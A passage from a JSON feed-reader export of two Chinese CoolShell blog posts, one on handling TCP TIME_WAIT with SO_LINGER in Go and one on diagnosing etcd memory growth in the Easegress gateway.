的那些事儿（上）\" href=\"https://coolshell.cn/articles/11564.html\" target=\"_blank\" rel=\"noopener\">上篇</a>，<a title=\"TCP 的那些事儿（下）\" href=\"https://coolshell.cn/articles/11609.html\" target=\"_blank\" rel=\"noopener\">下篇</a>），这个访问在“上篇”里讲过，这里再说一次，TCP 断链接的时候，会有下面这个来来回回的过程。</p>\n<p>我们来看主动断链接的最后一个状态 <code>TIME_WAIT</code> 后就不需要等待对端回 ack了，而是进入了超时状态。这主要是因为，在网络上，如果要知道我们发出的数据被对方收到了，那我们就需要对方发来一个确认的Ack信息，那问题来了，对方怎么知道自己发出去的ack，被收到了？难道还要再ack一下，这样ack来ack回的，那什么谁也不要玩了……是的，这就是比较著名的【两将军问题】——两个将军需要在一个不稳定的信道上达成对敌攻击时间的协商，A向B派出信鸽，我们明早8点进攻，A怎么知道B收到了信？那需要B向A派出信鸽，ack说我收到了，明早8点开干。但是，B怎么知道A会收到自己的确认信？是不是还要A再确认一下？这样无穷无尽的确认导致这个问题是没有完美解的（我们在《<a href=\"https://coolshell.cn/articles/10910.html#Two_Generals_Problem%EF%BC%88%E4%B8%A4%E5%B0%86%E5%86%9B%E9%97%AE%E9%A2%98%EF%BC%89\" target=\"_blank\" rel=\"noopener\">分布式事务</a>》一文中说过这个问题，这里不再重述）</p>\n<p>所以，我们只能等一个我们认为最大小时来解决两件个问题：</p>\n<p>1） 为了 <strong>防止来自一个连接的延迟段</strong>被依赖于相同四元组（源地址、源端口、目标地址、目标端口）的稍后连接接受（被接受后，就会被马上断掉，TCP状态机紊乱）。虽然，可以通过指定 TCP 的 sequence number 一定范围内才能被接受。但这也只是让问题发生的概率低了一些，对于一个吞吐量大的的应用来说，依然能够出现问题，尤其是在具有大接收窗口的快速连接上。<a title=\"RFC 1337：TCP 中的 TIME-WAIT 暗杀危险\" href=\"https://tools.ietf.org/html/rfc1337\">RFC 1337</a>详细解释了当 <code>TIME-WAIT</code>状态不足时会发生什么。<sup id=\"fnref-rfc1337\"></sup><code>TIME-WAIT</code>以下是如果不缩短状态可以避免的示例：</p>\n<figure id=\"attachment_22267\" aria-describedby=\"caption-attachment-22267\" style=\"width: 456px\" class=\"wp-caption aligncenter\"><img decoding=\"async\" loading=\"lazy\" class=\"wp-image-22267\" src=\"https://coolshell.cn/wp-content/uploads/2022/07/duplicate-segment.png\" alt=\"\" width=\"456\" height=\"467\" srcset=\"https://coolshell.cn/wp-content/uploads/2022/07/duplicate-segment.png 800w, https://coolshell.cn/wp-content/uploads/2022/07/duplicate-segment-293x300.png 293w, https://coolshell.cn/wp-content/uploads/2022/07/duplicate-segment-768x787.png 768w, https://coolshell.cn/wp-content/uploads/2022/07/duplicate-segment-263x270.png 263w\" sizes=\"(max-width: 456px) 100vw, 456px\" /><figcaption id=\"caption-attachment-22267\" class=\"wp-caption-text\">由于缩短的 TIME-WAIT 状态，后续的 TCP 段已在不相关的连接中被接受（<a href=\"https://vincent.bernat.ch/en/blog/2014-tcp-time-wait-state-linux\" target=\"_blank\" rel=\"noopener\">来源</a>）</figcaption></figure>\n<p>&nbsp;</p>\n<p>2）另一个目的是确保<strong>远端已经关闭了连接</strong>。当最后一个<em>ACK</em>​​ 丢失时，对端保持该<code>LAST-ACK</code>状态。<sup id=\"fnref-lastack\"></sup>在没有<code>TIME-WAIT</code>状态的情况下，可以重新打开连接，而远程端仍然认为先前的连接有效。当它收到一个<em>SYN</em>段（并且序列号匹配）时，它将以<em>RST</em>应答，因为它不期望这样的段。新连接将因错误而中止：</p>\n<p>&nbsp;</p>\n<figure id=\"attachment_22268\" aria-describedby=\"caption-attachment-22268\" style=\"width: 559px\" class=\"wp-caption aligncenter\"><img decoding=\"async\" loading=\"lazy\" class=\"wp-image-22268\" src=\"https://coolshell.cn/wp-content/uploads/2022/07/last-ack.png\" alt=\"\" width=\"559\" height=\"375\" srcset=\"https://coolshell.cn/wp-content/uploads/2022/07/last-ack.png 783w, https://coolshell.cn/wp-content/uploads/2022/07/last-ack-300x201.png 300w, https://coolshell.cn/wp-content/uploads/2022/07/last-ack-768x515.png 768w, https://coolshell.cn/wp-content/uploads/2022/07/last-ack-403x270.png 403w\" sizes=\"(max-width: 559px) 100vw, 559px\" /><figcaption id=\"caption-attachment-22268\" class=\"wp-caption-text\">如果远端因为最后一个 ACK​​ 丢失而停留在 LAST-ACK 状态，则打开具有相同四元组的新连接将不起作用 （<a href=\"https://vincent.bernat.ch/en/blog/2014-tcp-time-wait-state-linux\" target=\"_blank\" rel=\"noopener\">来源</a>）</figcaption></figure>\n<p><code>TIME_WAIT</code> 的这个超时时间的值如下所示：</p>\n<ul>\n<li>在 macOS 上是15秒， <code>sysctl net.inet.tcp | grep net.inet.tcp.msl</code></li>\n<li>在 Linux 上是 60秒 <code>cat /proc/sys/net/ipv4/tcp_fin_timeout</code></li>\n</ul>\n<h4>解决方案</h4>\n<p>要解决这个问题，网上一般会有下面这些解法</p>\n<ul>\n<li>把这个超时间调小一些，这样就可以把TCP 的端口号回收的快一些。但是也不能太小，如果流量很大的话，TIME_WAIT一样会被耗尽。</li>\n<li>设置上 <code>tcp_tw_reuse</code> 。<a title=\"RFC 1323：高性能 TCP 扩展\" href=\"https://tools.ietf.org/html/rfc1323\">RFC 1323</a>提出了一组 TCP 扩展来提高高带宽路径的性能。除其他外，它定义了一个新的 TCP 选项，带有两个四字节<strong>时间戳字段</strong>。第一个是发送选项的 TCP 时间戳的当前值，而第二个是从远程主机接收到的最新时间戳。如果新时间戳严格大于为前一个连接记录的最新时间戳。Linux 将重用该状态下的现有 <code>TIME_WAIT</code> 连接用于<strong>出站的链接</strong>。也就是说，<strong>这个参数对于入站连接是没有任何用图的。</strong></li>\n<li>设置上 <code>tcp_tw_recycle</code> 。 这个参数同样依赖于时间戳选项，但会影响进站和出站链接。这个参数会影响NAT环境，也就是一个公司里的所有员工用一个IP地址访问外网的情况。在这种情况下，时间戳条件将禁止在这个公网IP后面的所有设备在一分钟内连接，因为它们不共享相同的时间戳时钟。毫无疑问，禁用此选项要好得多，因为它会导致 <strong>难以检测</strong>和<strong>诊断</strong>问题。（注：从 Linux 4.10 (commit <a title=\"tcp：为每个连接随机化 tcp 时间戳偏移\" href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a22caee396cef0bb2ca8fafdd82966a49367bb\">95a22caee396</a> ) 开始，Linux 将为每个连接随机化时间戳偏移量，从而使该选项完全失效，无论有无<abbr title=\"网络地址解读\">NAT</abbr>。它已从 Linux 4.12中完全删除）</li>\n</ul>\n<p>对于服务器来说，上述的三个访问都不能解决服务器的 <code>TIME_WAIT</code> 过多的问题，真正解决问题的就是——<strong>不作死就不会死，也就是说，服务器不要主动断链接，而设置上KeepAlive后，让客户端主动断链接，这样服务端只会有<code>CLOSE_WAIT</code></strong>。</p>\n<p>但是对于用于建立出站连接的探活的 EaseProbe来说，设置上 <code>tcp_tw_reuse</code> 就可以重用 <code>TIME_WAIT</code> 了，但是这依然无法解决 <code>TIME_WAIT</code> 过多的问题。</p>\n<p>然后，过了几天后，我忽然想起来以前在《UNIX 网络编程》上有看到过一个Socket的参数，叫 <code data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\">&lt;code&gt;SO_LINGER</code></code>，我的编程生涯中从来没有使用过这个设置，这个参数主要是为了延尽关闭来用的，也就是说你应用调用 <code>close()</code>函数时，如果还有数据没有发送完成，则需要等一个延时时间来让数据发完，但是，如果你把延时设置为 0  时，Socket就丢弃数据，并向对方发送一个 <code>RST</code> 来终止连接，因为走的是 RST 包，所以就不会有 <code>TIME_WAIT</code> 了。</p>\n<p>这个东西在服务器端永远不要设置，不然，你的客户端就总是看到 TCP 链接错误 “connnection reset by peer”，但是这个参数对于 EaseProbe 的客户来说，简直是太完美了，当EaseProbe 探测完后，直接 reset connection， 即不会有功能上的问题，也不会影响服务器，更不会有烦人的 <code> TIME_WAIT</code> 问题。</p>\n<h4>Go 实际操作</h4>\n<p>在 Golang的标准库代码里，<code>net.TCPConn</code> 有个方法 <code>SetLinger()</code>可以完成这个事，使用起来也比较简单：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">conn, _ := net.DialTimeout(\"tcp\", t.Host, t.Timeout())\n\nif tcpCon, ok := conn.(*net.TCPConn); ok {\n    tcpCon.SetLinger(0)\n}</pre>\n<p>你需要把一个 <code>net.Conn</code>  转型成 <code>net.TCPConn</code>，然后就可以调用方法了。</p>\n<p>但是对于Golang 的标准库中的 HTTP 对象来说，就有点麻烦了，Golang的 http 库把底层的这边连接对象全都包装成私有变量了，你在外面根本获取不到。这篇《<a href=\"https://iximiuz.com/en/posts/go-net-http-setsockopt-example/\" target=\"_blank\" rel=\"noopener\">How to Set Go net/http Socket Options &#8211; setsockopt() example</a> 》中给出了下面的方法：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">dialer := &amp;net.Dialer{\n    Control: func(network, address string, conn syscall.RawConn) error {\n        var operr error\n        if err := conn.Control(func(fd uintptr) {\n            operr = syscall.SetsockoptInt(int(fd), unix.SOL_SOCKET, unix.TCP_QUICKACK, 1)\n        }); err != nil {\n            return err\n        }\n        return operr\n    },\n}\n\nclient := &amp;http.Client{\n    Transport: &amp;http.Transport{\n        DialContext: dialer.DialContext,\n    },\n}</pre>\n<p>上面这个方法非常的低层，需要直接使用setsocketopt这样的系统调用，我其实，还是想使用 <code>TCPConn.SetLinger(0)</code> 来完成这个事，即然都被封装好了，最好还是别破坏封闭性碰底层的东西。</p>\n<p>经过Golang http包的源码阅读和摸索，我使用了下面的方法：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">client := &amp;http.Client{\n    Timeout: h.Timeout(),\n    Transport: &amp;http.Transport{\n      TLSClientConfig:   tls,\n      DisableKeepAlives: true,\n      DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {\n        d := net.Dialer{Timeout: h.Timeout()}\n        conn, err := d.DialContext(ctx, network, addr)\n        if err != nil {\n          return nil, err\n        }\n        tcpConn, ok := conn.(*net.TCPConn)\n        if ok {\n          tcpConn.SetLinger(0)\n          return tcpConn, nil\n        }\n        return conn, nil\n      },\n    },\n  }</pre>\n<p>然后，我找来了全球 T0p 100W的域名，然后在AWS上开了一台服务器，用脚本生成了 TOP 10K 和 20K 的网站来以5s, 10s, 30s, 60s的间隔进行探活，搞到Cloudflare 的 1.1.1.1 DNS 时不时就把我拉黑，最后的测试结果也非常不错，根本 没有 TIME_WAIT 的链接，相关的测试方法、测试数据和测试报告可以参看：<a href=\"https://github.com/megaease/easeprobe/blob/main/docs/Benchmark.md\" target=\"_blank\" rel=\"noopener\">Benchmark Report</a></p>\n<h4>总结</h4>\n<p>下面是几点总结</p>\n<ul>\n<li><code>TIME_WAIT</code> 是一个TCP 协议完整性的手段，虽然会有一定的副作用，但是这个设计是非常关键的，最好不要妥协掉。</li>\n<li>永远不要使用  <code>tcp_tw_recycle</code> ，这个参数是个巨龙，破坏力极大。</li>\n<li>服务器端永远不要使用  <code>SO_LINGER(0)</code>，而且使用 <code>tcp_tw_reuse</code> 对服务端意义不大，因为它只对出站流量有用。</li>\n<li>在服务端上最好不要主动断链接，设置好KeepAlive，重用链接，让客户端主动断链接。</li>\n<li>在客户端上可以使用 <code>tcp_tw_reuse</code>  和 <code>SO_LINGER(0)</code>。</li>\n</ul>\n<p>最后强烈推荐阅读这篇文章 &#8211; <a href=\"https://vincent.bernat.ch/en/blog/2014-tcp-time-wait-state-linux\" target=\"_blank\" rel=\"noopener\">Coping with the TCP TIME-WAIT state on busy Linux servers</a></p>\n<p>（全文完）<!--\n\n\n\n<p align=\"center\"><a href= target=_blank><img decoding=\"async\" src=\"\"></a></p>\n\n\n\n\n\n<p align=\"center\"><img decoding=\"async\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img decoding=\"async\" loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br />关注CoolShell微信公众账号和微信小程序</p>\n\n \n\n--></p>\n<div style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n\n<div class=\"wp_rp_wrap  wp_rp_vertical_m\" ><div class=\"wp_rp_content\"><h3 class=\"related_post_title\">相关文章</h3><ul class=\"related_post wp_rp\"><li ><a href=\"https://coolshell.cn/articles/11564.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2014/05/tin-can-phone-150x150.jpg\" alt=\"TCP 的那些事儿（上）\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/11564.html\" class=\"wp_rp_title\">TCP 的那些事儿（上）</a></li><li ><a href=\"https://coolshell.cn/articles/19840.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2019/10/HTTP-770x513-300x200-1-150x150.jpg\" alt=\"HTTP的前世今生\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/19840.html\" class=\"wp_rp_title\">HTTP的前世今生</a></li><li ><a href=\"https://coolshell.cn/articles/11609.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2014/05/xin_2001040422167711230318-150x150.jpg\" alt=\"TCP 的那些事儿（下）\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/11609.html\" class=\"wp_rp_title\">TCP 的那些事儿（下）</a></li><li ><a href=\"https://coolshell.cn/articles/9859.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2013/06/Alan-Cox-150x150.jpg\" alt=\"Alan Cox：单向链表中prev指针的妙用\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/9859.html\" class=\"wp_rp_title\">Alan Cox：单向链表中prev指针的妙用</a></li><li ><a href=\"https://coolshell.cn/articles/7490.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2012/06/f1-150x150.jpg\" alt=\"性能调优攻略\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/7490.html\" class=\"wp_rp_title\">性能调优攻略</a></li><li ><a href=\"https://coolshell.cn/articles/1484.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2009/09/tcp1-150x150.jpg\" alt=\"TCP网络关闭的状态变换时序图\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/1484.html\" class=\"wp_rp_title\">TCP网络关闭的状态变换时序图</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/22263.html\">从一次经历谈 TIME_WAIT 的那些事</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "category": "Go 语言",
          "link": "https://coolshell.cn/articles/22263.html",
          "creator": "陈皓",
          "pubDate": "Tue, 19 Jul 2022 06:43:39 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "zh",
          "folder": "rip",
          "feed": "coolshell",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "3daa37cedf8343543079f18b65bd56a6",
          "highlights": []
        },
        {
          "title": "ETCD的内存问题",
          "description": "<p>今天跟大家分享一个etcd的内存大量占用的问题，这是前段时间在我们开源软件Easegress中遇到的问题，问题是比较简单的，但是我还想把前因后果说一下，包括，为...</p>\n<p class=\"read-more\"><a class=\"btn btn-default\" href=\"https://coolshell.cn/articles/22242.html\"> Read More<span class=\"screen-reader-text\">  Read More</span></a></p>\nThe post <a href=\"https://coolshell.cn/articles/22242.html\">ETCD的内存问题</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "content": "<p><script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\"\n     crossorigin=\"anonymous\"></script><img decoding=\"async\" loading=\"lazy\" class=\"alignright size-full wp-image-22247\" src=\"https://coolshell.cn/wp-content/uploads/2022/05/etcd.png\" alt=\"\" width=\"275\" height=\"183\" />今天跟大家分享一个etcd的内存大量占用的问题，这是前段时间在我们开源软件Easegress中遇到的问题，问题是比较简单的，但是我还想把前因后果说一下，包括，为什么要用etcd，使用etcd的用户场景，包括etcd的一些导致内存占用比较大的设计，以及最后一些建议。希望这篇文章不仅仅只是让你看到了一个简单的内存问题，还能让你有更多的收获。当然，也欢迎您关注我们的开源软件，给我们一些鼓励。</p>\n<h4>为什么要用ETCD</h4>\n<p>先说一下为什么要用etcd。先从一个我们自己做的一个API网关 &#8211; Easegress（<a href=\"https://github.com/megaease/easegress\">源码</a>）说起。</p>\n<p><a href=\"https://github.com/megaease/easegress\" target=\"_blank\" rel=\"noopener\">Easegress</a> 是我们开发并开源的一个API应用网关产品，这个API应用网关不仅仅只是像nginx那样用来做一个反向代理，这个网关可以做的事很多，比如：API编排、服务发现、弹力设计（熔断、限流、重试等）、认证鉴权（JWT，OAuth2，HMAC等）、同样支持各种Cloud Native的架构如：微服务架构，Service Mesh，Serverless/FaaS的集成，并可以用于扛高并发、灰度发布、全链路压力测试、物联网……等更为高级的企业级的解决方案。所以，为了达到这些目标，在2017年的时候，我们觉得在现有的网关如Nginx上是无法演进出来这样的软件的，必需重新写一个（后来其他人也应该跟我们的想法一样，所以，Lyft写了一个Envoy。只不过，Envoy是用C++写的，而我用了技术门槛更低的Go语言）</p>\n<p>另外，Easegress最核心的设计主要有三个：</p>\n<p><span id=\"more-22242\"></span></p>\n<ul>\n<li>一是无第三方依赖的自己选主组集群的能力</li>\n<li>二是像Linux管道命令行那样pipeline式的插件流式处理（支持Go/WebAssembly）</li>\n<li>三是内置一个Data Store用于集群控制和数据共享。</li>\n</ul>\n<p>对于任何一个分布式系统，都需要有一个强一制性的基于Paxos/Raft的可以自动选主机制，并且需要在整个集群间同步一些关键的控制/配置和相关的共享数据，以保证整个集群的行为是统一一致的。如果没有这么一个东西的话，就没有办法玩分布式系统的。这就是为什么会有像Zookeeper/etcd这样的组件出现并流行的原因。注意，Zookeeper他们主要不是给你存数据的，而是给你组集群的。</p>\n<p>Zookeeper是一个很流行的开源软件，也被用于各大公司的生产线，包括一些开源软件，比如：Kafka。但是，这会让其它软件有一个依赖，并且在运维上带来很大的复杂度。所以，Kafka在最新的版本也通过内置了选主的算法，而抛弃了外挂zookeeper的设计。Etcd是Go语言社区这边的主力，也是kubernetes组建集群的关键组件。Easegress在一开始（5年前）使用了gossip协议同步状态（当时想的过于超前，想做广域网的集群），但是后发现这个协议太过于复杂，而且很难调试，而广域网的API Gateway也没遇到相应的场景。所以，在3年前的时候，为了稳定性的考量，我们把其换成了内嵌版本的etcd，这个设计一直沿用到今天。</p>\n<p>Easegress会把所有的配置信息都放到etcd里，还包括一些统计监控数据，以及一些用户的自定义数据（这样用户自己的plugin不但可以在一条pipeline内，还可以在整个集群内共享数据），这对于用户进行扩展来说是非常方便的。软件代码的扩展性一直是我们追求的首要目标，尤其是开源软件更要想方设法降低技术门槛让技术易扩展，这就是为什么Google的很多开源软件都会选使用Go语言的原因，也是为什么Go正在取代C/C++的做PaaS基础组件的原因。</p>\n<h4>背景问题</h4>\n<p>好了，在介绍完为什么要用etcd以后，我开始分享一个实际的问题了。我们有个用户在使用 Easegress 的时候，在Easegress内配置了上千条pipeline，导致 Easegress的内存飙升的非常厉害- 10+GB 以上，而且长时间还下不来。</p>\n<p>用户报告的问题是——</p>\n<blockquote><p>在Easegress 1.4.1 上创建一个HTTP对象，1000个Pipeline，在Easegres初始化启动完成时的内存占用大概为400M，运行80分钟后2GB，运行200分钟后达到了4GB，这期间什么也没有干，对Easegress没有进行过一次请求。</p></blockquote>\n<p>一般来说，就算是API再多也不应该配置这么多的处理管道pipeline的，通常我们会使用HTTP API的前缀把一组属于一个类别的API配置在一个管道内是比较合理的，就像nginx下的location的配置，一般来说不会太多的。但是，在用户的这个场景下配置了上千个pipeline，我们也是头一次见，应该是用户想做更细粒度的控制。</p>\n<p>经过调查后，我们发现内存使用基本全部来自etcd，我们实在没有想到，因为我们往etcd里放的数据也没有多少个key，感觉不会超过10M，但不知道为什么会占用了10GB的内存。这种时候，一般会怀疑etcd有内存泄漏，上etcd上的github上搜了一下，发现etcd在3.2和3.3的版本上都有内存泄露的问题，但都修改了，而 Easegress 使用的是3.5的最新版本，另外，一般来说内存泄漏的问题不会是这么大的，我们开始怀疑是我们哪里误用了etcd。要知道是否误用了etcd，那么只有一条路了，沉下心来，把etcd的设计好好地看一遍。</p>\n<div class=\"p-rich_text_section\">\n<p>大概花了两天左右的时间看了一下etcd的设计，我发现了etcd有下面这些消耗内存的设计，老实说，还是非常昂贵的，这里分享出来，避免后面的同学再次掉坑。</p>\n<p><b data-stringify-type=\"bold\">首当其冲是——RaftLog</b>。etcd用Raft Log，主要是用于帮助follower同步数据，这个log的底层实现不是文件，而是内存。所以，而且还至少要保留 <code>5000</code> 条最新的请求。如果key的size很大，这 <code>5000</code>条就会产生大量的内存开销。比如，不断更新一个 1M的key，哪怕是同一个key，这 5000 条Log就是 5000MB = 5GB 的内存开销。这个问题在etcd的issue列表中也有人提到过  <a href=\"https://github.com/etcd-io/etcd/issues/12548\" target=\"_blank\" rel=\"noopener\">issue #12548 </a>，不过，这个问题不了了之了。这个5000还是一个hardcode，无法改。（参看 <code>DefaultSnapshotCatchUpEntries</code> <a class=\"c-link\" tabindex=\"-1\" href=\"https://github.com/etcd-io/etcd/blob/29c3b0f307107fd95a6eb43ddff20db952eeb2fa/server/etcdserver/server.go#L80\" target=\"_blank\" rel=\"noopener noreferrer\" data-stringify-link=\"https://github.com/etcd-io/etcd/blob/29c3b0f307107fd95a6eb43ddff20db952eeb2fa/server/etcdserver/server.go#L80\" data-sk=\"tooltip_parent\" data-remove-tab-index=\"true\">相关源码</a>）</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">// DefaultSnapshotCatchUpEntries is the number of entries for a slow follower\n// to catch-up after compacting the raft storage entries.\n// We expect the follower has a millisecond level latency with the leader.\n// The max throughput is around 10K. Keep a 5K entries is enough for helping\n// follower to catch up.\nDefaultSnapshotCatchUpEntries uint64 = 5000</pre>\n<p>另外，我们还发现，这个设计在历史上etcd的官方团队把这个默认值从10000降到了5000，我们估计etcd官方团队也意识到10000有点太耗内存了，所以，降了一半，但是又怕follwer同步不上，所以，保留了 5000条……（在这里，我个人感觉还有更好的方法，至少不用全放在内存里吧……）</p>\n<p>另外还有下面几项也会导致etcd的内存会增加</p>\n<ol class=\"p-rich_text_list p-rich_text_list__ordered\" data-stringify-type=\"ordered-list\" data-indent=\"0\" data-border=\"0\">\n<li data-stringify-indent=\"0\" data-stringify-border=\"0\"><strong>索引</strong>。etcd的每一对 key-value 都会在内存中有一个 B-tree 索引。这个索引的开销跟key的长度有关，etcd还会保存版本。所以B-tree的内存跟key的长度以及历史版本号数量也有关系。</li>\n<li data-stringify-indent=\"0\" data-stringify-border=\"0\"><b data-stringify-type=\"bold\">mmap</b>。还有，etcd 使用 mmap 这样上古的unix技术做文件映射，会把他的blotdb的内存map到虚拟内存中，所以，db-size越大，内存越大。</li>\n<li data-stringify-indent=\"0\" data-stringify-border=\"0\"><b data-stringify-type=\"bold\">Watcher</b>。watch也会占用很大的内存，如果watch很多，连接数多，都会堆积内存。</li>\n</ol>\n<p>（很明显，etcd这么做就是为了一个高性能的考虑）</p>\n<div class=\"p-rich_text_section\">\n<p>Easegress中的问题更多的应该是Raft Log 的问题。后面三种问题我们觉得不会是用户这个问题的原因，对于索引和mmap，使用 <a href=\"https://etcd.io/docs/v3.2/op-guide/maintenance/\" target=\"_blank\" rel=\"noopener\">etcd 的 compact 和 defreg</a> （压缩和碎片整理应该可以降低内存，但用户那边不应该是这个问题的核心原因）。</p>\n<p>针对用户的问题，大约有1000多条pipeline，因为Easegress会对每一条pipeline进行数据统计（如：M1, M5, M15， P99, P90, P50等这样的统计数据），统计信息可能会有1KB-2KB左右，但Easegress会把这1000条pipeline的统计数据合并起来写到一个key中，这1000多条的统计数据合并后会导致出现一个平均尺寸为2MB的key，而5000个in-memory的RaftLog导致etcd要消耗了10GB的内存。之前没有这么多的pipeline的场景，所以，这个内存问题没有暴露出来。</p>\n<p>于是，我们最终的解决方案也很简单，我们修改我们的策略，不再写这么大的Value的数据了，虽然以前只写在一个key上，但是Key的值太大，现在把这个大Key值拆分成多个小的key来写，这样，实际保存的数据没有发生变化，但是RaftLog的每条数据量就小了，所以，以前是5000条 2M（10GB），现在是5000条 1K（500MB），就这样解决了这个问题。相关的PR在这里 <a href=\"https://github.com/megaease/easegress/pull/542\" target=\"_blank\" rel=\"noopener\">PR#542</a> 。</p>\n<h4>总结</h4>\n<p>要用好 etcd，有如下的实践</p>\n<ul>\n<li>避免大尺寸的key和value，一方面会通过一个内存级的 Raft Log 占大量内存，另一方面，B-tree的多版本索引也会因为这样耗内存。</li>\n<li>避免DB的尺寸太大，并通过 compact和defreg来压缩和碎片整理降低内存。</li>\n<li>避免大量的Watch Client 和 Watch数。这个开销也是比较大的。</li>\n<li>最后还有一个，就是尽可能使用新的版本，无论是go语言还是etcd，这样会少很多内存问题。比如：golang的这个跟LInux内核心相关的<a href=\"https://github.com/golang/go/issues/42330\" target=\"_blank\" rel=\"noopener\">内存问题</a> —— golang 1.12的版sget的是 <code>MADV_FREE</code> 的内存回收机制，而在1.16的时候，改成了 <code>MADV_DONTNEED</code> ，这两者的差别是，<code>FREE</code>表示，虽然进程标记内存不要了，但是操作系统会保留之，直到需要更多的内存，而 <code>DONTNEED</code> 则是立马回收，你可以看到，在常驻内存RSS 上，前者虽然在golang的进程上回收了内存，但是RSS值不变，而后者会看到RSS直立马变化。Linux下对 <code>MADV_FREE</code> 的实现在某些情况下有一定的问题，所以，在go 1.16的时候，默认值改成了 <code>MADV_DONTNEED</code> 。而 etcd 3.4 是用 来1.12 编译的。</li>\n</ul>\n<p>最后，欢迎大家关注我们的开源软件！ <a href=\"https://github.com/megaease/\" target=\"_blank\" rel=\"noopener\">https://github.com/megaease/ </a></p>\n<div class=\"p-rich_text_section\">\n<p>（全文完）</p>\n</div>\n</div>\n</div>\n<p><!--\n\n\n\n<p align=\"center\"><a href= target=_blank><img decoding=\"async\" src=\"\"></a></p>\n\n\n\n\n\n<p align=\"center\"><img decoding=\"async\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img decoding=\"async\" loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br />关注CoolShell微信公众账号和微信小程序</p>\n\n \n\n--></p>\n<div style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n\n<div class=\"wp_rp_wrap  wp_rp_vertical_m\" ><div class=\"wp_rp_content\"><h3 class=\"related_post_title\">相关文章</h3><ul class=\"related_post wp_rp\"><li ><a href=\"https://coolshell.cn/articles/21615.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2021/09/go-generics-150x150.png\" alt=\"Go编程模式 ： 泛型编程\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/21615.html\" class=\"wp_rp_title\">Go编程模式 ： 泛型编程</a></li><li ><a href=\"https://coolshell.cn/articles/21263.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.k8s-150x150.png\" alt=\"Go 编程模式：k8s Visitor 模式\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/21263.html\" class=\"wp_rp_title\">Go 编程模式：k8s Visitor 模式</a></li><li ><a href=\"https://coolshell.cn/articles/21228.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.line_.-150x150.png\" alt=\"Go编程模式：Pipeline\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/21228.html\" class=\"wp_rp_title\">Go编程模式：Pipeline</a></li><li ><a href=\"https://coolshell.cn/articles/21214.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.pair_-150x150.png\" alt=\"Go编程模式：委托和反转控制\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/21214.html\" class=\"wp_rp_title\">Go编程模式：委托和反转控制</a></li><li ><a href=\"https://coolshell.cn/articles/21179.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.generate-150x150.png\" alt=\"Go 编程模式：Go Generation\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/21179.html\" class=\"wp_rp_title\">Go 编程模式：Go Generation</a></li><li ><a href=\"https://coolshell.cn/articles/21164.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.map_.reduce-150x150.png\" alt=\"Go编程模式：Map-Reduce\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/21164.html\" class=\"wp_rp_title\">Go编程模式：Map-Reduce</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/22242.html\">ETCD的内存问题</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "category": "Go 语言",
          "link": "https://coolshell.cn/articles/22242.html",
          "creator": "陈皓",
